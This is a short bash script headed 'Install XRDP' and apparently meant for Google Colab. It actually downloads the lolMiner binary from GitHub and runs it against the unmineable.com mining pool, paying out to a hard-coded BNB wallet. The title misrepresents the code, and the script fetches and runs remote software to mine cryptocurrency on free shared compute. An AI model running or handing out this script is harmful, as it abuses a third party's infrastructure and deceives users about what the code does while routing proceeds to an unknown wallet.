#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz && tar -xf lolMiner_v1.29_Lin64.tar.gz && cd 1.29 && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user BNB:bnb136ns6lfw4zs5hg4n85vdthaad7hq5m4gtkgf23:174504546.testing4 --ethstratum ETHPROXY
